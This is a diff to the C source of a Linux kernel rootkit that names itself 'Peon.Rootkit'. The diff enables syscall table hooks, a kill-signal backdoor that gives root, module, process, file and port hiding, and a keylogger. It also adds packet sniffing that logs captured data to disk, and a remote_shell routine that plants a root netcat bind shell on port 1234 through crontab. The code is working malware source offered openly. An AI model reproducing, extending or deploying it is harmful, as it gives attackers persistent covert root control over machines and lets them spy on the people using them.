@@ -13,12 +13,21 @@
 #include <linux/ip.h>
 #include <linux/tcp.h>
 #include <linux/udp.h>
+#include <linux/export.h>
+#include <linux/fs.h>
+#include <linux/list.h>
+#include <linux/cdev.h>
+#include <linux/termios.h>
+#include <linux/device.h>
+#include <linux/tty_ldisc.h>
+#include <linux/tty_driver.h>
+#include <linux/tty.h>
 #include <linux/types.h>
 #include <linux/socket.h>
 #include <linux/inet.h>
 #include <linux/limits.h>
 #include <linux/proc_fs.h>
-
+#include <linux/mutex.h>
 #include <linux/fs.h>
 #include <linux/buffer_head.h>
 #include <asm/processor.h>
@@ -29,28 +38,54 @@
 #include <asm/segment.h>
 #include <net/tcp.h>
 
-//#define HOOK_READ
-//#define HIDE_MODULE
-#define SECRETLINE "_peon_"
+/* define what you want*/
+#define ROOTACCESS
+#define HIDE_MODULE
+#define KEYLOGGER
+#define HIDECONTENT
+#define HIDEPROCESS
+#define HIDEDIR
+#define KEYLOGGER
+#define HIDECONTENT
+#define REMOTESHELL
+#define NETWORK_HTTP
+#define HIDE_COMM
+
+#define SECRETPROCESS "_root_"
+#define SECRETLINE "_root_"
 #define SECRETFILE "_root_"
-//#define NETWORK
-#define DEBUG
+
+#define DEBUG //print
+
+/* Signal & PID 4 obtain root access */
 #define SIG_4_ROOT 9
 #define PID_4_ROOT 88888
+
+/* Signal & PID 4 Show module */
 #define SIG_4_SHOW_MOD 9
 #define PID_4_SHOW_MOD 22222
 
+/* file path  */
+#define KEYLOG_PATH "/home/keylogger.txt"
+#define NET_PATH "/home/test.txt"
+
+/*hide hacker port*/
+#define PORT_TO_HIDE 6666
+
+
+
+
+#if defined(KEYLOGGER) || defined(HIDEDIR)
+#define HOOK_READ
+#endif
+
+#if defined(ROOTACCESS) || defined(HIDE_MODULE)
+#define HOOK_KILL
+#endif
+
 /*from net/ipv4/tcp_ipv4.c*/
 #define TMPSZ 150
-
-/*hide sshd*/
-#define PORT_TO_HIDE 6666
-#define KEYLOG_PATH "/home/keylogger.txt"
-#define TEST_PATH "/home/peon/test.txt"
-
-
 #define ETH_P_ALL 0x0003
-
 
 #if defined(__LP64__) || defined(_LP64) //__x86_64 /* 64 bits machine */
 #define OS_64_BITS
@@ -71,19 +106,17 @@ struct linux_dirent {
 
 unsigned long long file_saved_offset = 0;
 
-
-
-char *strnstr(const char *haystack, const char *needle, size_t n)
-{
-        char *s = strstr(haystack, needle);
-        if (s == NULL)
-                return NULL;
-        if (s-haystack+strlen(needle) <= n)
-                return s;
-        else
-                return NULL;
+char *strnstr(const char *haystack, const char *needle, size_t n) {
+    char *s = strstr(haystack, needle);
+    if (s == NULL)
+        return NULL;
+    if (s - haystack + strlen(needle) <= n)
+        return s;
+    else
+        return NULL;
 }
 
+#ifdef HIDEPROCESS
 
 /*
  * process hiding functions
@@ -93,7 +126,7 @@ struct task_struct *get_task(pid_t pid) {
     do {
         if (p->pid == pid)
             return p;
-        p =(struct task_struct *) p->tasks.next;
+        p = (struct task_struct *) p->tasks.next;
     } while (p != current);
     return NULL;
 
@@ -117,15 +150,14 @@ int invisible(pid_t pid) {
         buffer = kmalloc(200, GFP_KERNEL);
         memset(buffer, 0, 200);
         task_name(task, buffer);
-        if (strstr(buffer, "hidenameprocess")) {
+        if (strstr(buffer, SECRETPROCESS)) {
             kfree(buffer);
             return 1;
         }
     }
     return 0;
 }
-
-//(filename, O_RDONLY, 0);
+#endif
 
 struct file* file_open(const char* path, int flags, int rights) {
     struct file* filp = NULL;
@@ -189,7 +221,6 @@ char append_filez(const char *path_file, unsigned char * data, unsigned int size
     //if(!error);
 
     file_saved_offset += size;
-    //file_sync(fd);
     file_close(fd);
     return 0;
 
@@ -264,9 +295,6 @@ void enable_wp(void) {
 #endif
 }
 
-
-
-
 /* Adress of the syscall table */
 unsigned long ** syscall_table;
 
@@ -290,23 +318,11 @@ UpArrow: 0x1B 0x5B 0X41
 DownArrow: 0x1B 0x5B 0X42
 RightArrow: 0x1B 0x5B 0x43
 LeftArrow: 0x1b 0x5B 0x44
-Beak(Pause): 0x1b 0x5B 0x50
-
-
-Four byte keys:
-################
-
-Ins: 0x1b 0x5B 0x32 0x7E
-Home: 0x1b 0x5B 0x31 0x7E
-PgUp: 0x1b 0x5B 0x35 0x7E
-Del: 0x1b 0x5B 0x33 0x7E
-End: 0x1b 0x5B 0x34 0x7E
-PgDn: 0x1b 0x5B 0x36 0x7E
-
  */
 
 
-#ifdef HOOK_READ
+
+#ifdef KEYLOGGER
 
 void check_keyboard_buf(char __user *buf) {
     u16 index = 0;
@@ -389,8 +405,9 @@ void check_keyboard_buf(char __user *buf) {
     }
 
 }
+#endif
 
-
+#ifdef HOOK_READ
 asmlinkage long (*orig_read_call) (unsigned int fd, char __user *buf, size_t count);
 
 asmlinkage long hook_read_call(unsigned int fd, char __user *buf, size_t count) {
@@ -399,11 +416,13 @@ asmlinkage long hook_read_call(unsigned int fd, char __user *buf, size_t count) 
 
 
     if (ret < 0)return ret;
+#ifdef KEYLOGGER
     if (fd == 0) {
-        //check_keyboard_buf(buf);
-
+        check_keyboard_buf(buf);
     }
+#endif
 
+#ifdef HIDECONTENT
     if ((fd < 50) && (fd > 2)) {
 
         char *kbuf, *ch, *ch2;
@@ -422,35 +441,24 @@ asmlinkage long hook_read_call(unsigned int fd, char __user *buf, size_t count) 
             ch2 = strstr(ch + strlen(SECRETLINE) + 1, SECRETLINE);
         }
 
-        //if find
+        //if find it
         if (ch != NULL && ch2 != NULL) {
             modif_ret = strlen(ch) - strlen(ch2);
             memmove(ch, ch2 + strlen(SECRETLINE), strlen(ch2) - strlen(SECRETLINE) + 1);
             copy_to_user(buf, kbuf, ret);
         }
         kfree(kbuf);
-        return ret;
     }
+#endif
 
     return ret;
 }
 
 #endif
 
-#ifdef HOOK_OPEN
-
-asmlinkage long (*orig_open_call) (const char __user *filename, int flags, int mode);
-
-asmlinkage long hook_open_call(const char __user *filename, int flags, int mode) {
-
-    int ret = orig_open_call(filename, flags, mode);
-    return ret;
-}
-#endif
 
 
-
-
+#ifdef HIDEDIR
 #if defined(OS_64_BITS)
 /* -------------------------- 64 bits getdents version ------------------------------------------ */
 asmlinkage long (*orig_getdents) (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
@@ -509,12 +517,15 @@ asmlinkage long hacked_getdents64(unsigned int fd, struct linux_dirent64 __user 
     return ret;
 }
 #endif
+#endif
 
+#ifdef HOOK_KILL
 asmlinkage long (*kill_orig_call) (pid_t pid, int sig);
 
 asmlinkage long kill_hook_call(pid_t pid, int sig) {
 
-    /* Hacked function : kill -88 88*/
+#ifdef ROOTACCESS
+    /* Root access func*/
     if ((sig == SIG_4_ROOT) && (pid == PID_4_ROOT)) {
         struct task_struct *cur_task;
         struct cred *credz;
@@ -532,8 +543,10 @@ asmlinkage long kill_hook_call(pid_t pid, int sig) {
         printk(KERN_ALERT "Peon.Rootkit: [KILL -%d %d] shell root access", SIG_4_ROOT, PID_4_ROOT);
 #endif
     }
+#endif
 
-    /* show hided module kill -22 22*/
+#ifdef HIDEMODULE
+    /* show hided module kill */
     if ((sig == SIG_4_SHOW_MOD) && (pid == PID_4_SHOW_MOD) && FIRST_SHOW_MODULE) {
         FIRST_SHOW_MODULE = 0; // only one try
         /* attach save module to the list of module by seaching snd module */
@@ -542,10 +555,15 @@ asmlinkage long kill_hook_call(pid_t pid, int sig) {
         printk(KERN_ALERT "Peon.Rootkit: show module");
 #endif
     }
+#endif
     return kill_orig_call(pid, sig);
 }
+#endif
 
 /* -------------------------------------------------------------------- */
+
+
+#ifdef NETWORK_HTTP
 
 int dev_func(struct sk_buff *skb, struct net_device *dev, struct packet_type *pkt, struct net_device *dev2) {
     if (skb->pkt_type == PACKET_HOST) {
@@ -565,17 +583,16 @@ int dev_func(struct sk_buff *skb, struct net_device *dev, struct packet_type *pk
                 printk(KERN_ALERT "Peon.Rootkit: skb data len %d\n", skb->data_len);
                 printk(KERN_ALERT "Peon.Rootkit: skb mac len %d\n", skb->mac_len);
                 printk(KERN_ALERT "Peon.Rootkit: skb hdr len %d\n", skb->hdr_len);
+                printk(KERN_ALERT "Peon.Rootkit: skb taille %d\n", (int) strlen(data));
+                printk(KERN_ALERT "Peon.Rootkit: data=%s\n", data);
+                append_filez(NET_PATH, data, strlen(data));
+#endif
                 tmp = strstr(data, "-----------------------------");
                 if (tmp != NULL) {
                     int i = 0;
                     for (; i < strlen("-----------------------------"); i++)
                         *(tmp + i) = 'A';
                 }
-                printk(KERN_ALERT "Peon.Rootkit: skb taille %d\n", (int) strlen(data));
-                printk(KERN_ALERT "Peon.Rootkit: data=%s\n", data);
-                append_filez(TEST_PATH, data, strlen(data));
-
-#endif
 
             }
 
@@ -584,51 +601,74 @@ int dev_func(struct sk_buff *skb, struct net_device *dev, struct packet_type *pk
     kfree_skb(skb);
     return 0;
 }
+#endif
+
+#ifdef HIDE_COMM
 
 int (*old_tcp4_seq_show)(struct seq_file*, void *) = NULL;
 
-int hacked_tcp4_seq_show(struct seq_file *seq, void *v)
-{
-        int retval=old_tcp4_seq_show(seq, v);
+int hacked_tcp4_seq_show(struct seq_file *seq, void *v) {
+    int retval = old_tcp4_seq_show(seq, v);
 
-        char port[12];
+    char port[12];
 
-        sprintf(port,"%04X",PORT_TO_HIDE);
+    sprintf(port, "%04X", PORT_TO_HIDE);
 
-        if(strnstr(seq->buf+seq->count-TMPSZ,port,TMPSZ))
-                seq->count -= TMPSZ;
-return retval;   
+    if (strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ))
+        seq->count -= TMPSZ;
+    return retval;
 }
 
+void init_hide_net(void) {
 
-void init_hide_net(void){
+    struct tcp_seq_afinfo *my_afinfo = NULL;
+    struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;
 
-struct tcp_seq_afinfo *my_afinfo = NULL;
-        struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;
+    while (strcmp(my_dir_entry->name, "tcp"))
+        my_dir_entry = my_dir_entry->next;
 
-        while (strcmp(my_dir_entry->name, "tcp"))
-                my_dir_entry = my_dir_entry->next;
-
-        if((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data))
-        {
-                old_tcp4_seq_show = my_afinfo->seq_ops.show;
-                my_afinfo->seq_ops.show = hacked_tcp4_seq_show;
-        }
+    if ((my_afinfo = (struct tcp_seq_afinfo*) my_dir_entry->data)) {
+        old_tcp4_seq_show = my_afinfo->seq_ops.show;
+        my_afinfo->seq_ops.show = hacked_tcp4_seq_show;
+    }
 
 }
-void exit_hide_net(void){
- 	struct tcp_seq_afinfo *my_afinfo = NULL;
-        struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;
- 
-        while (strcmp(my_dir_entry->name, "tcp"))
-                my_dir_entry = my_dir_entry->next;
-        
-        if((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data))
-        {
-                my_afinfo->seq_ops.show=old_tcp4_seq_show;
-        }
-}
 
+void exit_hide_net(void) {
+    struct tcp_seq_afinfo *my_afinfo = NULL;
+    struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;
+
+    while (strcmp(my_dir_entry->name, "tcp"))
+        my_dir_entry = my_dir_entry->next;
+
+    if ((my_afinfo = (struct tcp_seq_afinfo*) my_dir_entry->data)) {
+        my_afinfo->seq_ops.show = old_tcp4_seq_show;
+    }
+}
+#endif
+
+#ifdef REMOTESHELL
+
+void remote_shell(void) {
+
+    char *envp[] = {"HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", 0}; /*Environmement variable*/
+    char *argv1[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y remove netcat*", NULL};
+    char *argv2[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y install netcat", NULL};
+    char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 1234 -e /bin/sh &", NULL}; /*Command : use netcat to launch a shell on the port 1234*/
+    char *argv4[] = {"/bin/sh", "-c", "echo \"* * * * * root /bin/netcat -l -p 1234 -e /bin/sh\" >> /etc/crontab", NULL};
+
+    call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC); /*Remove all netcat version*/
+    call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC); /*Install netcat-taditional*/
+    call_usermodehelper(argv4[0], argv4, envp, UMH_WAIT_PROC); /*Add rule to crontab to launch netcat every minute*/
+
+    allow_signal(SIGKILL);
+
+    printk(KERN_ALERT "ROOTKIT Remote Shell RUN\n");
+    call_usermodehelper(argv3[0], argv3, envp, UMH_WAIT_PROC); //Launch netcat the fisrt time
+
+    return;
+}
+#endif
 
 int init_module(void) {
 
@@ -645,9 +685,8 @@ int init_module(void) {
 #endif
 
 #ifdef HIDE_MODULE
-    /* hide module lsmod */
-    //save module
-    mod = THIS_MODULE;
+    /* hide module : lsmod */
+    mod = THIS_MODULE; //save module
     list_del(&THIS_MODULE->list);
 #ifdef DEBUG
     printk(KERN_INFO "Peon.Rootkit is hidden\n");
@@ -661,17 +700,19 @@ int init_module(void) {
 
     disable_wp();
 
+#ifdef HOOK_KILL
     /* Save the adress of the original kill syscall */
     kill_orig_call = (void *) syscall_table[__NR_kill];
 
     /* Replace the syscall in the table */
     syscall_table[__NR_kill] = (void*) kill_hook_call;
+#endif
 
-
+#define HIDEFILE
 #if defined(OS_64_BITS)
 
 #ifdef DEBUG	
-    printk(KERN_INFO "Peon.Rootkit is in 64 bits\n");
+    printk(KERN_INFO "Peon.Rootkit: Hide Files 64 bits\n");
 #endif
     /* Save the adress of the original getdents syscall */
     orig_getdents = (void *) syscall_table[__NR_getdents];
@@ -682,7 +723,7 @@ int init_module(void) {
 
 #else
 #ifdef DEBUG
-    printk(KERN_INFO "Peon.Rootkit is in 32 bits\n");
+    printk(KERN_INFO "Peon.Rootkit: Hide Files 64 bits\n");
 #endif
     /* Save the adress of the original getdents64 syscall */
     orig_getdents64 = (void *) syscall_table[__NR_getdents64];
@@ -692,17 +733,16 @@ int init_module(void) {
 
 #endif
 
-#ifdef NETWORK
+#ifdef NETWORK_HTTP
     //remove interfacepacket layer2
     __dev_remove_pack(&pt);
     // stuff for network, call "dev_func" function
     pt.type = htons(ETH_P_ALL);
-    // pt.dev = 0;
     pt.func = dev_func;
     dev_add_pack(&pt);
-#ifdef DEBUG
-    printk(KERN_INFO "Peon.Rootkit is loaded our Network device!\n");
-#endif
+    #ifdef DEBUG
+        printk(KERN_INFO "Peon.Rootkit is loaded our Network device!\n");
+    #endif
 #endif
 
 
@@ -719,14 +759,16 @@ int init_module(void) {
 #endif
 #endif
 
-#ifdef HOOK_OPEN
-    orig_open_call = (void *) syscall_table[__NR_open];
-
-    syscall_table[__NR_open] = (void*) hook_open_call;
+#ifdef HIDE_COMM
+    init_hide_net();
 #endif
-init_hide_net();
 
     enable_wp();
+
+
+#ifdef REMOTESHELL
+    remote_shell(); /*Launch the remote shell*/
+#endif
 
 #ifdef DEBUG
     printk(KERN_INFO "Peon.Rootkit is loaded!\n");
@@ -738,17 +780,23 @@ init_hide_net();
 void cleanup_module(void) {
 
     disable_wp();
-exit_hide_net();
-    /* Set the orignal call*/
-    syscall_table[__NR_kill ] = (void*) kill_orig_call;
 
+
+#ifdef HIDE_COMM
+    exit_hide_net();
+#endif
+
+
+
+    /* Set the orignal calls*/
+
+#ifdef HOOK_KILL
+    syscall_table[__NR_kill ] = (void*) kill_orig_call;
+#endif
 #ifdef HOOK_READ
     syscall_table[ __NR_read ] = (void*) orig_read_call;
 #endif
 
-#ifdef HOOK_OPEN
-    syscall_table[ __NR_open ] = (void*) orig_open_call;
-#endif
 
 
 #if defined(OS_64_BITS)
@@ -757,13 +805,13 @@ exit_hide_net();
     syscall_table[ __NR_getdents64] = (void*) orig_getdents64;
 #endif
 
-#ifdef NETWORK
-    //remove interfacepacket layer2
-    __dev_remove_pack(&pt);
+#ifdef NETWORK_HTTP
 
-#ifdef DEBUG
-    printk(KERN_INFO "Peon.Rootkit remove our Network device!\n");
-#endif
+    __dev_remove_pack(&pt); //remove interfacepacket layer2
+
+    #ifdef DEBUG
+        printk(KERN_INFO "Peon.Rootkit remove our Network device!\n");
+    #endif
 #endif
 
     enable_wp();
